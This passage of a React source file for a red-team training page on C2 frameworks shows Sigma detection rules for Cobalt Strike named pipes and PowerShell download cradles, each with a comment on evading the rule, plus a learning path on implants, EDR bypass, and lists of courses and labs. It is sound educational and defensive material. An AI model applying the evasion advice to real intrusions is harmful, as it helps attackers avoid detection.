              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Cobalt Strike Named Pipe</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="yaml">{`title: Cobalt Strike Named Pipe Detection
logsource:
    category: pipe_created
    product: windows
detection:
    selection:
        PipeName|startswith:
            - '\\\\MSSE-'
            - '\\\\status_'
            - '\\\\postex_'
            - '\\\\msagent_'
    condition: selection
level: critical

# Evasion: Use pipename in malleable profile to customize
# Example: set pipename "Winsock2\\\\CatalogChangeListener-";`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Suspicious PowerShell</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="yaml">{`title: Suspicious PowerShell Download Cradle
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'powershell'
            - 'IEX'
        CommandLine|contains:
            - 'Net.WebClient'
            - 'DownloadString'
            - 'Invoke-WebRequest'
    condition: selection
level: high

# Evasion: Avoid well-known cradle patterns
# Use .NET directly, WinAPI, or alternative download methods`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
          </Paper>
        </Box>
      )}

      {/* Tab 6: Resources */}
      {activeTab === 6 && (
        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Quick Reference Commands
            </Typography>
            
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Sliver</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.sliver}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Cobalt Strike</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.cobaltStrike}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Havoc</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.havoc}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Mythic</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.mythic}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Empire</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.empire}</CodeBlock>
              </AccordionDetails>
            </Accordion>
          </Paper>

          {/* Recommended Learning Path */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Recommended Learning Path
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Follow this progression to build solid C2 skills from beginner to advanced.
            </Typography>
            <Stepper orientation="vertical">
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>1. Foundations (Weeks 1-4)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Understand networking, protocols, and basic security concepts.
                  </Typography>
                  <List dense>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Learn TCP/IP, DNS, HTTP/HTTPS basics" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Set up a home lab (VMs: Kali, Windows Server, Domain)" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice with Metasploit (easy to learn, foundational)" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>2. Modern C2 Basics (Weeks 5-8)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Start with Sliver - it's free, modern, and well-documented.
                  </Typography>
                  <List dense>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Install and configure Sliver server" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Generate implants for different OSes" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice pivoting and lateral movement" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>3. Infrastructure & OPSEC (Weeks 9-12)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Learn to build production-grade infrastructure.
                  </Typography>
                  <List dense>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Deploy redirectors using Apache/Nginx" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Configure SSL certificates and domain categorization" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice traffic blending and profile customization" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>4. Advanced Operations (Months 4+)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Master evasion, custom tooling, and adversary simulation.
                  </Typography>
                  <List dense>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Study EDR internals and bypass techniques" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Learn to write BOFs and custom loaders" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice OPSEC-focused operations in labs" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
            </Stepper>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Learning Resources
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "Red Team Ops Course", desc: "Zero-Point Security RTO - Highly recommended", url: "https://training.zeropointsecurity.co.uk", category: "Course" },
                { name: "Sliver Documentation", desc: "Official Sliver wiki and tutorials", url: "https://sliver.sh", category: "Docs" },
                { name: "Cobalt Strike Training", desc: "Official CS training and certification", url: "https://www.cobaltstrike.com/training", category: "Course" },
                { name: "The C2 Matrix", desc: "Compare all C2 frameworks features", url: "https://www.thec2matrix.com", category: "Reference" },
                { name: "SANS SEC565", desc: "Red Team Ops & Adversary Emulation", url: "https://www.sans.org/sec565", category: "Course" },
                { name: "SpecterOps Blog", desc: "Advanced red team research and techniques", url: "https://posts.specterops.io", category: "Blog" },
                { name: "Mythic Documentation", desc: "Official Mythic wiki and agent docs", url: "https://docs.mythic-c2.net", category: "Docs" },
                { name: "Red Team Village", desc: "Community talks and resources", url: "https://redteamvillage.io", category: "Community" },
                { name: "MITRE ATT&CK", desc: "Framework for adversary tactics and techniques", url: "https://attack.mitre.org", category: "Reference" },
              ].map((res, idx) => (
                <Grid item xs={12} md={4} key={idx}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{res.name}</Typography>
                      <Chip label={res.category} size="small" variant="outlined" />
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{res.desc}</Typography>
                    <Typography
                      component="a"
                      href={res.url}
                      target="_blank"
                      rel="noopener"
                      sx={{ color: "primary.main", fontSize: "0.85rem" }}
                    >
                      Visit →
                    </Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Practice Labs & Environments
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Hands-on practice is essential. These labs provide safe, legal environments to practice C2 operations.
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "HackTheBox Pro Labs", desc: "Offshore, RastaLabs, Cybernetics - realistic corporate networks", difficulty: "Advanced" },
                { name: "TryHackMe Red Team Path", desc: "Guided learning with structured rooms and paths", difficulty: "Beginner-Intermediate" },
                { name: "PentesterLab", desc: "Web and network exploitation with progression", difficulty: "Intermediate" },
                { name: "YOURPWN Labs", desc: "Active Directory attack paths and techniques", difficulty: "Advanced" },
                { name: "Home Lab (DIY)", desc: "Build your own AD environment with VMs", difficulty: "Beginner" },
                { name: "DVWA/DVCP", desc: "Damn Vulnerable apps for basic practice", difficulty: "Beginner" },
              ].map((lab, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 2, p: 2, bgcolor: alpha(theme.palette.primary.main, 0.03), borderRadius: 1 }}>
                    <SpeedIcon sx={{ color: "primary.main" }} />
                    <Box sx={{ flex: 1 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{lab.name}</Typography>
                      <Typography variant="caption" color="text.secondary">{lab.desc}</Typography>
                    </Box>
                    <Chip 
                      label={lab.difficulty} 
                      size="small" 
                      color={lab.difficulty === "Beginner" ? "success" : lab.difficulty === "Intermediate" ? "warning" : "error"}
                      variant="outlined"
                    />
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* Books and Reading */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Recommended Reading
            </Typography>
            <Grid container spacing={2}>
              {[
                { title: "Red Team Development and Operations", author: "Joe Vest & James Tubberville", topic: "Red team methodology" },
                { title: "The Hacker Playbook 3", author: "Peter Kim", topic: "Practical red teaming" },
                { title: "Attacking Network Protocols", author: "James Forshaw", topic: "Protocol analysis" },
                { title: "Evading EDR", author: "Matt Hand", topic: "Modern evasion techniques" },
              ].map((book, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Box sx={{ display: "flex", gap: 2 }}>
                    <Box sx={{ width: 4, bgcolor: "primary.main", borderRadius: 1 }} />
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{book.title}</Typography>
                      <Typography variant="caption" color="text.secondary">by {book.author}</Typography>
                      <Typography variant="body2" sx={{ mt: 0.5 }}>{book.topic}</Typography>
                    </Box>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>
        </Box>
      )}
    </Container>
    </LearnPageLayout>
  );
}
